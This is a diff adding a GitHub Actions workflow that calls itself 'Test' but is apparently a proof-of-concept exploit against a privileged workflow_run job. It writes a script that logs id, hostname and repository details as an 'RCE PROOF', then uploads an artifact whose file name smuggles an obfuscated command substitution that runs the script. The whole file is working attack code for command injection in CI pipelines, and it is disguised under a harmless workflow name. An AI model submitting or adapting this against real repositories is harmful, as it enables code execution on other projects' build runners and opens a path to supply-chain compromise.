@@ -1,0 +1,43 @@
+name: Test
+
+on:
+  pull_request:
+    branches: [main]
+
+permissions:
+  contents: read
+
+jobs:
+  forge:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Craft artifact
+        env:
+          PR_NUMBER: ${{ github.event.number }}
+          INJECTED_NAME: "$(bash${IFS}$'\\x2f'tmp$'\\x2f'content$'\\x2f'content$'\\x2f'p.sh).txt"
+        run: |
+          mkdir -p out
+          cat > out/p.sh <<'SCRIPT'
+          #!/bin/bash
+          {
+            echo "### RCE PROOF - privileged workflow_run job"
+            echo "- id: $(id)"
+            echo "- hostname: $(hostname)"
+            echo "- repo: $GITHUB_REPOSITORY"
+            echo "- workflow: $GITHUB_WORKFLOW"
+            echo "- event: $GITHUB_EVENT_NAME"
+            echo "- run_id: $GITHUB_RUN_ID"
+            echo "- job: $GITHUB_JOB"
+            echo "- event_json_workflow: $(jq -r '.workflow_run.name' "$GITHUB_EVENT_PATH" 2>/dev/null)"
+          } >> "$GITHUB_STEP_SUMMARY"
+          echo x
+          SCRIPT
+          chmod +x out/p.sh
+          echo "hello from forged artifact" > out/x.txt
+          printf '%s' "$PR_NUMBER" > out/pr_number.txt
+          : > "out/$INJECTED_NAME"
+          ls -la out
+      - uses: actions/upload-artifact@v4
+        with:
+          name: content
+          path: out
